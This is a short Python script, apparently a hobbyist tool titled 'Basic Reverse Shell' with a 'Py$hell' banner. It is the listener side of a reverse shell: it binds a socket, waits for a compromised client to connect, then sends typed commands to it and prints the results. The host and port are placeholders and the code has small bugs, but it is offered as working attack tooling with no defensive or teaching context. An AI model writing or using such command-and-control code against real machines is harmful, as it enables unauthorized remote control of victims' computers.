# Basic Reverse Shell Written in python #

import sys
from socket import *
import colorama
import pyfiglet
from colorama import Fore

colorama.init()

Light_Red = Fore.LIGHTRED_EX
Cyan = Fore.CYAN
Magenta = Fore.MAGENTA
Red = Fore.RED
Green = Fore.GREEN
Blue = Fore.BLUE
Reset = Fore.RESET
BUF_SIZE = 2048
FORMAT = "utf-8"
host = "server ip"
port = (server port)
s = socket(AF_INET, SOCK_STREAM)

print(f"{Blue}{pyfiglet.figlet_format('Py$hell')}{Reset}")


# Create socket
def socket_create():
    try:
        global host
        global port
        global s
        host = "server ip"
        port = (server port)
        s = socket(AF_INET, SOCK_STREAM)
    except Exception as msg:
        print(f"{Red}socket Creation Error: {Reset}" + str(msg))
        print(f"{Light_Red}Retrying...{Reset}")


# Bind socket to port and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        print(f"{Cyan}[+] Server Started{Reset}")
        print(f"{Magenta}[+] Listening For Connection...{Reset}")
        s.bind((host, port))
        s.listen(5)
    except Exception as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        socket_bind()


# Establish connection with client
def socket_accept():
    try:
        conn, addr = s.accept()
        print(f"{Green}Connection has been established {Reset}" + "\n" + " | " "IP " + addr[0] + " | Port "
              + str(addr[1]) + " | ")
        shell(conn)
    except Exception as msg:
        print(f"{Red}Socket Accepting Error: {Reset}" + str(msg))
        s.close()

# execute commands
def shell(conn):
    while True:
        cmd = input()
        if cmd == 'exit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(BUF_SIZE), FORMAT)
            print(client_response, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()
    shell(s.accept)


main()
